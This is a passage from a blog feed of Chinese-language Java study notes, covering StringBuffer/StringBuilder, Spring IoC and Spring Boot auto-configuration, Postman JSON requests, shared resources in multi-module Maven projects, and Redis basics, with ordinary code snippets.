class="line">stringBuffer.<span class="keyword">append</span>(<span class="string">"c"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次调用stringBuffer.append 方法都需要加锁和解锁，如果虚拟机检测到有一系列连串的对同一个对象加锁和解锁操作，就会将其合并成一次范围更大的加锁和解锁操作，即在第一次append方法时进行加锁，最后一次append方法结束后进行解锁。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/StringBuffer和StringBuilder</title>
      <link href="java/StringBuffer%E5%92%8CStringBuilder/"/>
      <url>java/StringBuffer%E5%92%8CStringBuilder/</url>
      
        <content type="html"><![CDATA[<h1 id="StringBuffer-和-StringBuilder-的使用和区别"><a href="#StringBuffer-和-StringBuilder-的使用和区别" class="headerlink" title="StringBuffer 和 StringBuilder 的使用和区别"></a>StringBuffer 和 StringBuilder 的使用和区别</h1><a id="more"></a><p>和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。</p><p><img src="../images/StringBuffer%E5%92%8CStringBuilder/java-string-20201208.png" alt="img"></p><p>在使用 StringBuffer 类时，每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象，所以如果需要对字符串进行修改推荐使用 StringBuffer。</p><p>StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。</p><p>由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RunoobTest</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="number">10</span>);</span><br><span class="line">        sb.append(<span class="string">"Runoob.."</span>);</span><br><span class="line">        System.out.println(sb);  </span><br><span class="line">        sb.append(<span class="string">"!"</span>);</span><br><span class="line">        System.out.println(sb); </span><br><span class="line">        sb.insert(<span class="number">8</span>, <span class="string">"Java"</span>);</span><br><span class="line">        System.out.println(sb); </span><br><span class="line">        sb.delete(<span class="number">5</span>,<span class="number">8</span>);</span><br><span class="line">        System.out.println(sb);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/StringBuffer%E5%92%8CStringBuilder/2021-03-01-java-stringbuffer.svg" alt="img"></p><p>在应用程序要求线程安全的情况下, 则必须使用StringBuffer类 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">    StringBuffer sBuffer = <span class="keyword">new</span> StringBuffer(<span class="string">"菜鸟教程官网："</span>);</span><br><span class="line">    sBuffer.append(<span class="string">"www"</span>);</span><br><span class="line">    sBuffer.append(<span class="string">".runoob"</span>);</span><br><span class="line">    sBuffer.append(<span class="string">".com"</span>);</span><br><span class="line">    System.out.println(sBuffer);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/Spring分析</title>
      <link href="java/Spring%E5%88%86%E6%9E%90/"/>
      <url>java/Spring%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Ioc-源码学习"><a href="#Spring-Ioc-源码学习" class="headerlink" title="Spring Ioc 源码学习"></a>Spring Ioc 源码学习</h1><a id="more"></a><h2 id="spirng问题"><a href="#spirng问题" class="headerlink" title="spirng问题"></a>spirng问题</h2><ol><li>聊聊spring </li><li>说明bean的声明周期</li><li>循环依赖</li><li>三级缓存</li><li>FactoryBean和beanFactory </li><li>ApplicationContext和Beanfactory 的区别</li><li>设计模式 </li></ol><p>Spring是spring家族的基石</p><h2 id="Ioc"><a href="#Ioc" class="headerlink" title="Ioc"></a>Ioc</h2><p>基本概念</p><p>好莱坞原则: Don’t call us, we will call you</p><p>IOC容器装着 bean对象   -&gt;  数据结构 -&gt; map-&gt; 三级缓存   (map结构存储对象 )  hashmap   </p><p>对象存储时都存储的为 K-V格式的数据 -&gt; 创建对象 -&gt; 获取对象  -&gt;beanName /Bean实例对象 </p><h3 id="源码中的三级缓存"><a href="#源码中的三级缓存" class="headerlink" title="源码中的三级缓存"></a>源码中的三级缓存</h3><p><img src="../images/SpringIoc/image-20210416214130584.png" alt="image-20210416214130584">  文件中的 </p><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210416214109290.png" alt="image-20210416214109290"></p><p>三级缓存</p><p>从 singletonObjects 开始的三个 Map结构 </p><h3 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h3><p>分析AOP源码中找到createProxy </p><p> 在after 方法中 到 WrapIfNecessary 方法再到  createProxy  ,创建代理对象 </p><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210417140637111.png" alt="image-20210417140637111"></p><p><strong>DefaultListableBeanFactory</strong></p><p>bean工厂管理着bean ,现有工厂 ,才有 bean </p><p>对spring源码 参照几个接口  </p><h2 id="使用框架的意义"><a href="#使用框架的意义" class="headerlink" title="使用框架的意义"></a>使用框架的意义</h2><h3 id="控制反转-思想"><a href="#控制反转-思想" class="headerlink" title="控制反转(思想)"></a>控制反转(思想)</h3><p> 利用工厂和容器 将对象的管理变得有条理起来,  提供了Ioc 用来将 组件之间解耦 , 提高了程序的可维护性 </p><p>在程序规模不断变大情况下依然可以有着较低的维护难度,</p><p>在组件比较多的系统当中, 如果耦合度过强,那么程序中出现一点小问题就会导致整个项目的停转, 修复的时间也会随着耦合度的提高而提高, 在解决错误的时候无疑会变得更加具有难度. 所以应该降低对象之间的耦合度 </p><p>spring提供了 控制反转, 借用与第三方,也就是IOC容器进行 对象之间的解耦, 对象的控制权上交给IOC容器,  彼此之间就没有了耦合关系,</p><p>让对象按照IOC容器的规则 来,  控制权交到了IOC容器当中, 也就实现了控制反转 </p><p>控制权从 object -&gt; IOc</p><h3 id="依赖注入-设计模式"><a href="#依赖注入-设计模式" class="headerlink" title="依赖注入(设计模式)"></a>依赖注入(设计模式)</h3><p>将实例变量传入到一个对象当中去</p><p>(Dependency injection means giving an object its instance variables)</p><p>IoC使用依赖注入作为实现控制反转的方式, 控制反转还有其它的实现方式, 例如 ServiceLoacter</p><h2 id="springboot自动配置"><a href="#springboot自动配置" class="headerlink" title="springboot自动配置"></a>springboot自动配置</h2><p>从<img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421122757898.png" alt="image-20210421122757898"> 走到</p><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421122822091.png" alt="image-20210421122822091"></p><p>到</p><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421122835172.png" alt="image-20210421122835172"></p><p>到</p><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421122908458.png" alt="image-20210421122908458"></p><p>在AutoAutoConfigurationImportSelector.class中 向下看</p><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421123106539.png" alt="image-20210421123106539"></p><p>the auto-configuration  should be imported   </p><p>AutoConfigurationEntry 方法会筛选出有效的自动配置类</p><p>看注释</p><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421123301679.png" alt="image-20210421123301679"></p><p>getCandidateConfigurations 方法加载spring boot 配置的自动配置类</p><p>下断点,查看筛选过后的 自动配置 , debug</p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421124705636.png" alt="image-20210421124705636" style="zoom:200%;" /><p>从maven下管理的lib</p><hr><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421133027565.png" alt="image-20210421133027565"></p><p>向下找到web的package</p><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421133054326.png" alt="image-20210421133054326"></p><p>查看源码</p><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421133132993.png" alt="image-20210421133132993"></p><p>@EnableConfigurationProperties(SerProperties.class) 启动指定类的</p><p>ConfigurationProperties 功能, 将配置文件中的值和<code>ServerProperties</code>绑定起来并把 ServerProperties 加入到IOC容器</p><p>看到ServerProperties</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"server"</span>, ignoreUnknownFields = <span class="keyword">true</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerProperties</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Server HTTP port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Integer port;</span><br></pre></td></tr></table></figure><p>@ConfigurationProperties 绑定属性映射文件中的server开头的属性,结合默认配置 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 路径spring-boot-autoconfigure-2.1.1.RELEASE.jar*</span><br><span class="line">*# /META-INF/spring-configuration-metadata.json*</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">   <span class="string">"name"</span>: <span class="string">"server.port"</span>,</span><br><span class="line">   <span class="string">"type"</span>: <span class="string">"java.lang.Integer"</span>,</span><br><span class="line">   <span class="string">"description"</span>: <span class="string">"Server HTTP port."</span>,</span><br><span class="line">   <span class="string">"sourceType"</span>: <span class="string">"org.springframework.boot.autoconfigure.web.ServerProperties"</span>,</span><br><span class="line">   <span class="string">"defaultValue"</span>: <span class="number">8080</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="../images/Spring%E5%88%86%E6%9E%90/image-20210421135256852.png" alt="image-20210421135256852"></p><p>达到了自动配置的目的</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>springboot启动时加载主配置类, 开启自动配置功能@EnableAutoConfiguration </p><p>@EnableAutoConfiguration 给容器导入 META-INF/spring.factories 里定义的自动配置类</p><h3 id="XML配置"><a href="#XML配置" class="headerlink" title="XML配置"></a>XML配置</h3><p>定义 helloService Bean.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloService"</span> <span class="attr">class</span>=<span class="string">"net.codingme.boot.service.HelloService"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引入配置。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@ImportResource</span>(value = <span class="string">"classpath:spring-service.xml"</span>)</span><br><span class="line"><span class="variable">@SpringBootApplication</span></span><br><span class="line">public class BootApplication &#123;</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">public</span> <span class="selector-tag">static</span> <span class="selector-tag">void</span> <span class="selector-tag">main</span>(String[] args) &#123;</span><br><span class="line">        <span class="selector-tag">SpringApplication</span><span class="selector-class">.run</span>(BootApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-2-注解配置"><a href="#5-2-注解配置" class="headerlink" title="5.2 注解配置"></a>5.2 注解配置</h3><p>此种方式和上面的XML配置是等效的，也是官方推荐的方式。<code>@Configuration</code> 注解的类（要在扫描的包路径中）会被扫描到。</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>配置类，相当于传统Spring 开发中的 xml-&gt; bean的配置</span></span></span><br><span class="line"><span class="comment"><span class="markdown"> *</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>@Author niujinpeng</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>@Date 2018/12/7 0:04</span></span></span><br><span class="line"><span class="comment"><span class="markdown"> */</span></span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">ServiceConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>默认添加到容器中的 ID 为方法名（helloService）</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    public HelloService helloService() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HelloService();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">@Conditional扩展注解</th><th align="left">作用（判断是否满足当前指定条件）</th></tr></thead><tbody><tr><td align="left">@ConditionalOnJava</td><td align="left">系统的java版本是否符合要求</td></tr><tr><td align="left">@ConditionalOnBean</td><td align="left">容器中存在指定Bean；</td></tr><tr><td align="left">@ConditionalOnMissingBean</td><td align="left">容器中不存在指定Bean；</td></tr><tr><td align="left">@ConditionalOnExpression</td><td align="left">满足SpEL表达式指定</td></tr><tr><td align="left">@ConditionalOnClass</td><td align="left">系统中有指定的类</td></tr><tr><td align="left">@ConditionalOnMissingClass</td><td align="left">系统中没有指定的类</td></tr><tr><td align="left">@ConditionalOnSingleCandidate</td><td align="left">容器中只有一个指定的Bean，或者这个Bean是首选Bean</td></tr><tr><td align="left">@ConditionalOnProperty</td><td align="left">系统中指定的属性是否有指定的值</td></tr><tr><td align="left">@ConditionalOnResource</td><td align="left">类路径下是否存在指定资源文件</td></tr><tr><td align="left">@ConditionalOnWebApplication</td><td align="left">当前是web环境</td></tr><tr><td align="left">@ConditionalOnNotWebApplication</td><td align="left">当前不是web环境</td></tr><tr><td align="left">@ConditionalOnJndi</td><td align="left">JNDI存在指定项</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/springboot</title>
      <link href="java/springboot/"/>
      <url>java/springboot/</url>
      
        <content type="html"><![CDATA[<h1 id="记录一些写程序中得到的知识"><a href="#记录一些写程序中得到的知识" class="headerlink" title="记录一些写程序中得到的知识"></a>记录一些写程序中得到的知识</h1><a id="more"></a><h2 id="使用postman"><a href="#使用postman" class="headerlink" title="使用postman"></a>使用postman</h2><h3 id="post请求传递给-RequestBody-数据"><a href="#post请求传递给-RequestBody-数据" class="headerlink" title="post请求传递给@RequestBody 数据"></a>post请求传递给@RequestBody 数据</h3><p><img src="../images/springboot/image-20210420164023668.png" alt="image-20210420164023668"></p><p>这里使用的是 @RequestBody 获得post传递的json数据 </p><p>因为是以<strong>简单对象</strong>接收数据, 所以使用 json  , RESTfunl web服务一般会将返回地数据以JSON的形式返回 ,  </p><p>第一次发送数据</p><p><img src="../images/springboot/image-20210420164355301.png" alt="image-20210420164355301"></p><p>得到的返回</p><p><img src="../images/springboot/image-20210420164608039.png" alt="image-20210420164608039"></p><p>再次添加</p><p><img src="../images/springboot/image-20210420164652108.png" alt="image-20210420164652108"></p><p>因为 我设置的@RequestBody 接受对象Book还存在着另一个对象, 所以想到为Book对象中的booCase对象传入数据 </p><p>,自己直接在postman中尝试发送数据的时候因为参考一些别的文章, 导致发送数据的格式不正确 </p><p>所以想到自己添加一个数据进bookCase对象,并利用book对象返回json数据得到 正确格式 </p><p><img src="../images/springboot/image-20210420173827462.png" alt="image-20210420173827462"></p><p>返回地数据为 </p><p><img src="../images/springboot/image-20210420173851245.png" alt="image-20210420173851245"></p><p>按照这种类型的格式进行json的写入</p><p><img src="../images/springboot/image-20210420173939168.png" alt="image-20210420173939168"></p><p>传入结果</p><p><img src="../images/springboot/image-20210420173957464.png" alt="image-20210420173957464"></p><p>网上搜到这种为 嵌套json , 还有 json 数组等其他数据格式 </p><h2 id="处理多moudle"><a href="#处理多moudle" class="headerlink" title="处理多moudle"></a>处理多moudle</h2><p>共享resources 文件 </p><p><img src="../images/springboot/image-20210525221027455.png" alt="image-20210525221027455"></p><p>上面配置只是让maven 在构建项目的时候将配置文档放到相应classes 目录下 </p><p>需要在配置文件中引用需要做相应配置 </p><p><img src="../images/springboot/image-20210525221226047.png" alt="image-20210525221226047"></p><p><img src="../images/springboot/image-20210525221235376.png" alt="image-20210525221235376"></p><p>上面配置会在在多个resources 下的不同.properties  文件中用到 </p><h3 id="项目公用resources-文件夹"><a href="#项目公用resources-文件夹" class="headerlink" title="项目公用resources 文件夹"></a>项目公用resources 文件夹</h3><p><a href="https://my.oschina.net/u/150107/blog/3191606" target="_blank" rel="noopener">参考</a></p><p>共享资源的pom 可以配置如下 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;project&gt;</span><br><span class="line">  ...  </span><br><span class="line">  &lt;groupId&gt;org.test&lt;<span class="regexp">/groupId&gt;</span></span><br><span class="line"><span class="regexp">  &lt;artifactId&gt;common&lt;/</span>artifactId&gt;</span><br><span class="line">  ...</span><br><span class="line">  &lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">      &lt;plugin&gt;</span><br><span class="line">        &lt;artifactId&gt;maven-remote-resources-plugin&lt;<span class="regexp">/artifactId&gt;</span></span><br><span class="line"><span class="regexp">        &lt;version&gt;1.8.0&lt;/</span>version&gt;</span><br><span class="line">        &lt;executions&gt;</span><br><span class="line">          &lt;execution&gt;</span><br><span class="line">            &lt;goals&gt;</span><br><span class="line">              &lt;goal&gt;bundle&lt;<span class="regexp">/goal&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/g</span>oals&gt;</span><br><span class="line">          &lt;<span class="regexp">/execution&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>executions&gt;</span><br><span class="line">        &lt;configuration&gt;</span><br><span class="line">          &lt;includes&gt;</span><br><span class="line">            &lt;include&gt;**<span class="comment">/*.properties&lt;/include&gt;</span></span><br><span class="line"><span class="comment">          &lt;/includes&gt;</span></span><br><span class="line"><span class="comment">        &lt;/configuration&gt;</span></span><br><span class="line"><span class="comment">      &lt;/plugin&gt;</span></span><br><span class="line"><span class="comment">    &lt;/plugins&gt;</span></span><br><span class="line"><span class="comment">  &lt;/build&gt;</span></span><br><span class="line"><span class="comment">  ...</span></span><br><span class="line"><span class="comment">&lt;/project&gt;</span></span><br></pre></td></tr></table></figure><p>这将在genroate-resources 阶段将共享资源捆版到JAR 文件中, 这意味着其它模块可以在此后的任何阶段使用这些资源 </p><p>配置其他模块以使用共享模板 </p><p>要在另一个模块中使用共享资源, 需要按如下方式配置插件:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;project&gt;</span><br><span class="line">  ...</span><br><span class="line">  &lt;groupId&gt;org.test&lt;<span class="regexp">/groupId&gt;</span></span><br><span class="line"><span class="regexp">  &lt;artifactId&gt;resource-consumer&lt;/</span>artifactId&gt;</span><br><span class="line">  ...</span><br><span class="line">  &lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">      &lt;plugin&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.maven.plugins&lt;<span class="regexp">/groupId&gt;</span></span><br><span class="line"><span class="regexp">        &lt;artifactId&gt;maven-remote-resources-plugin&lt;/</span>artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.8</span><span class="number">.0</span>&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">        &lt;configuration&gt;</span></span><br><span class="line"><span class="regexp">          &lt;resourceBundles&gt;</span></span><br><span class="line"><span class="regexp">            &lt;resourceBundle&gt;org.test:common:$&#123;project.version&#125;&lt;/</span>resourceBundle&gt;</span><br><span class="line">          &lt;<span class="regexp">/resourceBundles&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>configuration&gt;</span><br><span class="line">        &lt;executions&gt;</span><br><span class="line">          &lt;execution&gt;</span><br><span class="line">            &lt;goals&gt;</span><br><span class="line">              &lt;goal&gt;process&lt;<span class="regexp">/goal&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/g</span>oals&gt;</span><br><span class="line">          &lt;<span class="regexp">/execution&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>executions&gt;</span><br><span class="line">      &lt;<span class="regexp">/plugin&gt;</span></span><br><span class="line"><span class="regexp">   &lt;/</span>plugins&gt;</span><br><span class="line">  &lt;<span class="regexp">/build&gt;</span></span><br><span class="line"><span class="regexp">  ...</span></span><br><span class="line"><span class="regexp">  &lt;dependencies&gt;</span></span><br><span class="line"><span class="regexp">    &lt;dependency&gt;</span></span><br><span class="line"><span class="regexp">      &lt;groupId&gt;$&#123;project.groupId&#125;&lt;/g</span>roupId&gt;</span><br><span class="line">      &lt;artifactId&gt;common&lt;<span class="regexp">/artifactId&gt;</span></span><br><span class="line"><span class="regexp">      &lt;version&gt;$&#123;project.version&#125;&lt;/</span>version&gt;</span><br><span class="line">    &lt;<span class="regexp">/dependency&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>dependencies&gt;</span><br><span class="line">&lt;<span class="regexp">/project&gt;</span></span><br></pre></td></tr></table></figure><p>这将检索common模块的捆绑资源, 处理捆绑中的每个资源. 并将他们放入resource-consumer模块的$ {project.build.directory} / maven-shared-archive-resources目录中。</p><p>*<em>注: 上述模块名称根据自己使用的进行命名 *</em></p><h2 id="对项目之间项目依赖问题"><a href="#对项目之间项目依赖问题" class="headerlink" title="对项目之间项目依赖问题"></a>对项目之间项目依赖问题</h2><p>将 项目文件的package 都使用相同的名称 </p><p>如</p><p> <img src="../images/springboot/image-20210525222834199.png" alt="image-20210525222834199"></p><p>将依赖都放入主moudle 中集中引用，其余子 moudle之间避免相互引用</p><p>将 maven-plugin<img src="../images/springboot/image-20210529205922882.png" alt="image-20210529205922882">添加到主moudle 里， 我这里是web moudle</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/Redis</title>
      <link href="java/Redis/"/>
      <url>java/Redis/</url>
      
        <content type="html"><![CDATA[<h1 id="学习Redis"><a href="#学习Redis" class="headerlink" title="学习Redis"></a>学习Redis</h1><a id="more"></a><h2 id="用作分布式缓存"><a href="#用作分布式缓存" class="headerlink" title="用作分布式缓存"></a>用作分布式缓存</h2><p>因为Redis 中的数据 存放在内存中 , 所以可以将Redis 作为程序与数据库直接交互的中间商 </p><p>即业务层 和 数据访问层之间的一个 “临时仓库” ,  使用sql语句直接操纵数据库是一项比较耗时的工作,  如果有大规模的用户向数据库传递更改数据的请求, 将会造成数据库连接问题. 比如门就那么大 , 做多只能同时进两个人,你非要进四个.<br>redis 可以作为临时存放 用户请求的地方, 将请求分批次去传输到数据库, 在这里可以直接先返回一定的结果, 因为用户请求会因为网速等原因分先后, </p><p>这里也涉及到 Redis的内部工作机制     同时使用Redis 的常见问题 有</p><ul><li>缓存和数据库双写一致性问题</li><li>缓存雪崩问题</li><li>缓存击穿问题</li><li>缓存的并发竞争问题</li></ul><h3 id="Redis-内部机制"><a href="#Redis-内部机制" class="headerlink" title="Redis 内部机制"></a>Redis 内部机制</h3><p>Redis为单线程操作 </p><p>操作方式主要有以下三点: </p><ol><li><p>纯内存操作</p></li><li><p>单线程操作, 避免了频繁的上下文切换</p></li><li><p>采用了非阻塞I/O多路复用机制 </p><p>这里说一下 I/O多路复用机制</p></li></ol><h4 id="I-O多路复用机制"><a href="#I-O多路复用机制" class="headerlink" title="I/O多路复用机制"></a>I/O多路复用机制</h4><p>传统的并发模型 会将每个 I/O 流中的操作分配给一个新的线程管理, 线程的创建需要得到CPU得允许,或者说 线程在工作时需要得到CPU的空间, CPU 根据自身的固件上的芯片, 也即 CPU核数去同时执行基于核数的线程操作, 这里涉及到线程数和CPU同时处理任务数的关系 </p><p>简单的来说就是比如 1核单cpu(不涉及当前多核cpu和超线程模式) , 同一时间只能执行一个线程 ,</p><p>有 I/O 流工作 A , B .  A 先到, B后到,  thread A  负责A ,  thread B 负责B , thread B要等thread A完成工作A后 再向CPU申请资源区完成B</p><p>这样导致线程过多但资源不够,如果同时间有 thread B 和thread C 同时等待A的工作完成, 将会造成竞争, 会增加时间</p><p> I/O 多路复用, 完成多个工作, 只有一个线程  A</p><p>thread A通过跟踪每个I/O流的状态 , 也就是任务的工作内容, 地点 ,来管理多个I/O流</p><p>一下为Redis线程模型 </p><p><img src="../images/Redis/v2-8be3d5948f178144a83eec26e2fa2ab6_720w.jpg" alt="img"></p><p>Redis-client 在操作的时候，会产生具有不同事件类型的 Socket。在服务端，有一段 I/O 多路复用程序，将其置入队列之中。然后，文件事件分派器，依次去队列中取，转发到不同的事件处理器中。String</p><p>最常规的 set/get 操作，Value 可以是 String 也可以是数字。一般做一些复杂的计数功能的缓存。</p><p>五种数据类型</p><p>Hash</p><p>这里 Value 存放的是结构化的对象，比较方便的就是操作其中的某个字段。我在做单点登录的时候，就是用这种数据结构存储用户信息，以 CookieId 作为 Key，设置 30 分钟为缓存过期时间，能很好的模拟出类似 Session 的效果。</p><p>List</p><p>使用 List 的数据结构，可以做简单的消息队列的功能。另外，可以利用 lrange 命令，做基于 Redis 的分页功能，性能极佳，用户体验好。</p><p>Set</p><p>因为 Set 堆放的是一堆不重复值的集合。所以可以做全局去重的功能。我们的系统一般都是集群部署，使用 JVM 自带的 Set 